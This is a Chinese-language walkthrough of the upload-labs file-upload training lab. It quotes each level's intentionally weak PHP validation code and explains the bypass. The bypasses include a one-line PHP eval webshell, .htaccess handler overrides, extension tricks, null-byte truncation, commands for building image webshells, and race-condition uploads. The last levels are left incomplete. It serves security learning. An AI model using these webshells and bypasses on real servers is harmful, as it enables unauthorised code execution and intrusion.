> [任意文件上传靶场upload-labs下载地址](https://github.com/c0ny1/upload-labs/releases)

### Pass-01- 前端JS校验绕过

尝试上传一句话木马

```php
<?php @eval($_REQUEST[6868])?>
```

![image-20230830130722553](./imgs/423c0add25ece31c6fbb27f076b71457.png)

**代码审计：**

```php
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

做了白名单策略，只允许`.jpg|.png|.gif`后缀的文件

**绕过方式：**

前端校验一文不值，删除js校验代码`onsubmit="return checkFile()`

![image-20230830130937527](./imgs/424b74873ad7aa09069e234000bf9efa.png)

### Pass-02- 文件类型MIME类型绕过

**代码审计：**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']            
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '文件类型不正确，请重新上传！';
        }
    } else {
        $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！';
    }
}
```



**绕过方式：**

文件类型绕过

修改`Content-Type`值

![image-20230830131659244](./imgs/ddfda2b077fcc78af034049f09f9338e.png)

### Pass-03- 文件名后缀黑名单绕过

**代码审计：**

做了黑名单策略

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array('.asp','.aspx','.php','.jsp');
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if(!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;            
            if (move_uploaded_file($temp_file,$img_path)) {
                 $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```



**绕过方式：**

![image-20230830132050274](./imgs/5fbd274798fe98de138abb22d89f2805.png)

### Pass-04- .htaccess绕过

**代码审计：**

做了黑名单策略

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //收尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传!';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```



**绕过方式：**

上传`.htaccess`文件，内容如下

```htaccess
<FilesMatch "jpg">
Sethandler application/x-httpd-php 
</FilesMatch>
```

> .htaccess会改变uploads这个目录下的文件解析规则, 调用php的解析器去解析一个文件名只需包含`“jpg”`字符串的任意文件
>
> 简单来说, 若一个文件的文件名为`1.jpg`, 其内容是`phpinfo()`, 那么apache就会调用php解析器去解析此文件

![image-20230830135541957](./imgs/92012b5e9d1c5ae065c137d8cd610764.png)

再上传`2.jpg`, 文件内容如下:

```php
<?php phpinfo();?>
```

![image-20230830135710102](./imgs/994924c8085dcbe69d6048729b82ca17.png)

查看上传路径`http://192.168.80.139/upload/2.jpg`

![image-20230830145045679](./imgs/a0c9f3ff6dddea050865328933fa6b1a.png)

访问到图片里的php代码

![image-20230830145114846](./imgs/c5174f76876c595b701d0ffed7d97298.png)

### Pass-05- 文件名后缀大写绕过

**代码审计：**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空

        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```



相比上一关来说，把`.htacces`也进入了黑名单

![image-20230830150045295](./imgs/40bf12a21ef0b93599d5d7de85992e82.png)

还没有做大小写转换

**绕过方式：**

我们可以把上传的木马文件后缀名改为大写

`1.php`改成`1.PHP`

上传文件，查看文件路径

![image-20230830150641393](./imgs/794d9582401a31e56f8f452e5bb3a6bc.png)

在地址栏中访问`http://192.168.80.139/upload/202308301506064212.PHP`

没有报错说明上传成功

这个时候可以使用蚁剑来连接

![image-20230830150753110](./imgs/8202134f40e4e7beeebb96f659b3c45e.png)

进入目录管理

![image-20230830150845243](./imgs/81522877e9e7d1851b2f7141e44248c0.png)

### Pass-06- 文件名后缀加空格绕过

**代码审计：**

代码中少了 `trim($file_ext)`：该函数是将字符串首位的空格去除

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = $_FILES['upload_file']['name'];
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file,$img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件不允许上传';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```



**绕过方式：**

![image-20230830153129061](./imgs/037b70b7c2ab56d20d5eafac65be72bd.png)

### Pass-07- 文件名后缀加点绕过

**代码审计：**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

少了`deldot`函数

 `$file_name = deldot($file_name);`//删除文件名末尾的点

**绕过方式：**

利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过：

![image-20230830154310217](./imgs/bf736e068f5b5a94892562dc7a8b288e.png)

### Pass-08-文件名后缀 ::$DATA绕过

代码审计：

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```



`$file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA`

> 在window的时候如果文件名+`"::$DATA"`会把`::$DATA`之后的数据当成文件流处理,不会检测后缀名，且保持`::$DATA`之前的文件名，他的目的就是不检查后缀名

漏洞绕过：

在上传文件名后面加上 `::$DATA`，这样就不会 检测我们上传的文件后缀是什么了

![image-20230830155002397](./imgs/f3c79c4b385c9b4ddb460a5cab1fb3aa.png)

### Pass-09-文件名后缀拼接绕过

**代码审计：**



```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = deldot($file_name);//删除文件名末尾的点
        $file_ext = strrchr($file_name, '.');
        $file_ext = strtolower($file_ext); //转换为小写
        $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA
        $file_ext = trim($file_ext); //首尾去空
        
        if (!in_array($file_ext, $deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH.'/'.$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $is_upload = true;
            } else {
                $msg = '上传出错！';
            }
        } else {
            $msg = '此文件类型不允许上传！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

代码先是去除文件名前后的空格，再去除文件名末尾的`.`，再通过`strrchar`函数来寻找`.`来确认文件名的后缀，但是最后保存文件的时候没有重命名而使用的原始的文件名，导致可以利用1.php. .(点+空格+点)来绕过

**绕过方式：**

上传`1.php`文件，bp抓包修改文件名后缀`1.php. .`

使用`. .`绕过，首先删除一个点，再首尾去空，该文件还是会以`.`结尾

![image-20230830165444606](./imgs/70db5102a29a4874b0e464107f9704c8.png)

### Pass-10-文件名后缀双写绕过

**代码审计：**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");
        $file_name = trim($_FILES['upload_file']['name']);
        $file_name = str_ireplace($deny_ext,"", $file_name);
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = UPLOAD_PATH.'/'.$file_name;        
        if (move_uploaded_file($temp_file, $img_path)) {
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}
```

将文件名进行过滤操作后，将文件名拼接在路径后面，所以需要绕 过前面的首尾去空以及去点

**绕过方式：**

修改上传的文件后缀为：`1.pphphp`

![image-20230830171549011](./imgs/97eb3079a0bb8441fac7d8efa0656446.png)

### Pass-11- GET型00截断

> 00截断原理：
>
> 		0x00是十六进制表示方法，是ascii码为0的字符，在有些函数处理时，会把这个字符当做结束符。
> 			
> 		系统在对文件名的读取时，如果遇到0x00,就会认为读取已结束。
> 			
> 		可以通过00截断，绕过对应的白名单验证
>
> 
>
> 		1.php0x00.jpg

**代码审计：**

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = '上传出错！';
        }
    } else{
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}
```

白名单过滤，只允许`('jpg','png','gif')`后缀的文件

![image-20230830194758382](./imgs/7d3ed12cf95d9f1aaf62eecc7e321a44.png)

==**GET型提交的内容会被 自动进行URL解码**==



**绕过方式：**



上传`2.jpg`里面内容是`<?php   phpinfo();?>`

![image-20230830193636706](./imgs/62d7b3359733a7fcd631703ed5f19793.png)

![image-20230830193657470](./imgs/9f64994172348056a4dd54083f35ea4b.png)

图片上传成功，右键复制图像 链接

![image-20230830193718264](./imgs/6eaa5b143246902c972c04b0f5a6a9e4.png)

发现地址中有乱码

![image-20230830193802039](./imgs/1b4924e4f0d5a15a00d048999395b020.png)

去掉`2.php`后面 的参数，访问到php探针

![image-20230830194026456](./imgs/a4c917d8dd7017358b27a5f80f570c55.png)

### Pass-12-  POST型00截断

**代码审计：**

```php
$is_upload = false;
$msg = null;
if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1);
    if(in_array($file_ext,$ext_arr)){
        $temp_file = $_FILES['upload_file']['tmp_name'];
        $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext;

        if(move_uploaded_file($temp_file,$img_path)){
            $is_upload = true;
        } else {
            $msg = "上传失败";
        }
    } else {
        $msg = "只允许上传.jpg|.png|.gif类型文件！";
    }
}

```

同样的白名单策略，与上一关不同的是，这次换成了`$_POST`

![image-20230830194947171](./imgs/41bca5aa5eeab721e461aedd2e15d6e4.png)

==**在POST请求中，`%00`不会被自动解码，需要在16进制中修改为`00`**==

**绕过方式：**

![image-20230830195244759](./imgs/68859102368784850a2641daf551fe47.png)

![image-20230830195434438](./imgs/1a442d802ad11d8ecc25e46f7519c65a.png)

![image-20230830195455115](./imgs/1c01cbc4ddb27a9005f19333611f8a07.png)

修改完成后点击`Forward`放包，上传成功！

复制图像链接

![image-20230830195722660](./imgs/3b191f5b7afeac5086e55c858457d859.png)

```
http://127.0.0.1/upload/2.php%EF%BF%BD/7520230830195703.jpg
```

去掉后面多余的参数

```
http://127.0.0.1/upload/2.php
```

![image-20230830195820783](./imgs/306d5b486d4d9494db1144eca7f5c092.png)

### Pass-13- 文件内容头部绕过

**代码审计：**

![image-20230830201054731](./imgs/e00542ced1b5a0810b154e13b67bfc19.png)

**绕过方式：**

`shell.php`内容

```php
<?php @eval($_REQUEST[6868])?>
```

![image-20230830201527499](./imgs/f5d81e3c266db52013cd78b7b71a9cd0.png)

图片木马制作：

```bash
windows:
	copy 1.jpg /b + 1.php /a 2.jpg
Linux:
	cat 1.jpg shell.php > shell.jpg
```

![image-20230830201455021](./imgs/d72f614afb0b1296746a0a3995ba809d.png)

图片上传成功

![image-20230830201747393](./imgs/4799dc0128d48a2975097cd4119ce848.png)

查看上传路径

![image-20230830201910430](./imgs/82a2d25a8721d1b50830fe0c5d56aac1.png)

图片的上传路径`/upload/6720230830201732.jpg`

![image-20230830202333851](./imgs/54de747d6b1c8371d042e5036816e93c.png)

结合文件包含漏洞执行图片木马

```
http://127.0.0.1/include.php?file=./upload/6720230830201732.jpg
```

蚁剑连接

![image-20230830202916275](./imgs/d25db17254c214590ceb25a13efbba0b.png)

### Pass-14- getimagesize()检查绕过

代码审计：

![image-20230830203339475](./imgs/b94926abbcb67b8b98270ac1803af279.png)

`getimagesize()`函数对文件内容头部做检查

**绕过方式：**

1、直接上传图片木马

2、上传php木马，修改文件内容（文件幻数）

![image-20230830203812922](./imgs/db973cf41bda25ad94e807ead5eb4a2d.png)

图片上传路径`upload/1820230830203805.gif`

要想触发木马，需要结合文件包含 来实现

```php
http://127.0.0.1/include.php?file=./upload/1820230830203805.gif
```

![image-20230830204029159](./imgs/45e881e48152753ded8d5eb83ca017f3.png)

蚁剑连接

![image-20230830204008577](./imgs/bf7dc91ed1dbcedf8b7eb0c0df7af007.png)

### Pass-15- exif_imagetype()检测绕过

**代码审计：**

![image-20230830204441884](./imgs/26681ce089d1813a83fcc2770d467568.png)

exif_imagetype — 判断一个图像的类型是否为图片文件

**绕过方式：**

生成图片木马绕过函数检测，利用文件包含漏洞连接webshell

### Pass-16- 二次渲染绕过

综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染

因此我们需要绕过二次渲染的部分，也就是在在二次渲染不会改变的部分加入我们需要的php木马的代码



 满足`move_uploaded_file`就可以上传成功!!!

**绕过方式：**
[地址详解](https://xz.aliyun.com/t/2657)

### Pass-17-条件竞争

**代码审计：**

```php
$is_upload = false;
$msg = null;

if(isset($_POST['submit'])){
    $ext_arr = array('jpg','png','gif');
    $file_name = $_FILES['upload_file']['name'];
    $temp_file = $_FILES['upload_file']['tmp_name'];
    $file_ext = substr($file_name,strrpos($file_name,".")+1);
    $upload_file = UPLOAD_PATH . '/' . $file_name;

    if(move_uploaded_file($temp_file, $upload_file)){
        if(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;
             rename($upload_file, $img_path);
             $is_upload = true;
        }else{
            $msg = "只允许上传.jpg|.png|.gif类型文件！";
            unlink($upload_file);
        }
    }else{
        $msg = '上传出错！';
    }
}

```

这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。



发现如果上传的符合它的白名单，那就进行重命名，如果不符合，直接删除！解析的机会都没有，这让我想到了条件竞争，如果我在它删除之前就访问这个文件，他就不会删除了。接下来直接实验
上传一个php文件，然后burp抓包发到爆破模块

**绕过方式：**

![image-20240720221810036](./imgs/image-20240720221810036.png)

![image-20240720221647297](./imgs/image-20240720221647297.png)

start attack发包，然后用浏览器一直访问info.php，如果在上传的瞬间访问到了，它就无法删除。

![image-20240720221841986](./imgs/image-20240720221841986.png)



### Pass18-

**代码审计**：

```php
//index.php
$is_upload = false;
$msg = null;
if (isset($_POST['submit']))
{
    require_once("./myupload.php");
    $imgFileName =time();
    $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName);
    $status_code = $u->upload(UPLOAD_PATH);
    switch ($status_code) {
        case 1:
            $is_upload = true;
            $img_path = $u->cls_upload_dir . $u->cls_file_rename_to;
            break;
        case 2:
            $msg = '文件已经被上传，但没有重命名。';
            break; 
        case -1:
            $msg = '这个文件不能上传到服务器的临时文件存储目录。';
            break; 
        case -2:
            $msg = '上传失败，上传目录不可写。';
            break; 
        case -3:
            $msg = '上传失败，无法上传该类型文件。';
            break; 
        case -4:
            $msg = '上传失败，上传的文件过大。';
            break; 
        case -5:
            $msg = '上传失败，服务器已经存在相同名称文件。';
            break; 
        case -6:
            $msg = '文件无法上传，文件不能复制到目标目录。';
            break;      
        default:
            $msg = '未知错误！';
            break;
    }
}

//myupload.php
class MyUpload{
......
......
...... 
  var $cls_arr_ext_accepted = array(
      ".doc", ".xls", ".txt", ".pdf", ".gif", ".jpg", ".zip", ".rar", ".7z",".ppt",
      ".html", ".xml", ".tiff", ".jpeg", ".png" );

......
......
......  
  /** upload()
   **
   ** Method to upload the file.
   ** This is the only method to call outside the class.
   ** @para String name of directory we upload to
   ** @returns void
  **/
  function upload( $dir ){
    
    $ret = $this->isUploadedFile();
    
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->setDir( $dir );
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkExtension();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );
    }

    $ret = $this->checkSize();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }
    
    // if flag to check if the file exists is set to 1
    
    if( $this->cls_file_exists == 1 ){
      
      $ret = $this->checkFileExists();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }

    // if we are here, we are ready to move the file to destination

    $ret = $this->move();
    if( $ret != 1 ){
      return $this->resultUpload( $ret );    
    }

    // check if we need to rename the file

    if( $this->cls_rename_file == 1 ){
      $ret = $this->renameFile();
      if( $ret != 1 ){
        return $this->resultUpload( $ret );    
      }
    }
    
    // if we are here, everything worked as planned :)

    return $this->resultUpload( "SUCCESS" );
  
  }
......
......
...... 
};

```

本关对文件后缀名做了白名单判断，然后会一步一步检查文件大小、文件是否存在等等，将文件上传后，对文件重新命名，同样存在条件竞争的漏洞。可以不断利用burp发送上传图片马的数据包，由于条件竞争，程序会出现来不及rename的问题，从而上传成功：

**绕过方式**：

### Pass19-

**代码审计：**

```php
$is_upload = false;
$msg = null;
if (isset($_POST['submit'])) {
    if (file_exists(UPLOAD_PATH)) {
        $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess");

        $file_name = $_POST['save_name'];
        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);

        if(!in_array($file_ext,$deny_ext)) {
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}

```

本关考察CVE-2015-2348 move_uploaded_file() 00截断，上传webshell，同时自定义保存名称，直接保存为php是不行的

发现move_uploaded_file()函数中的img_path是由post参数save_name控制的，因此可以在save_name利用00截断绕过：

**绕过方式：**



### Pass20-





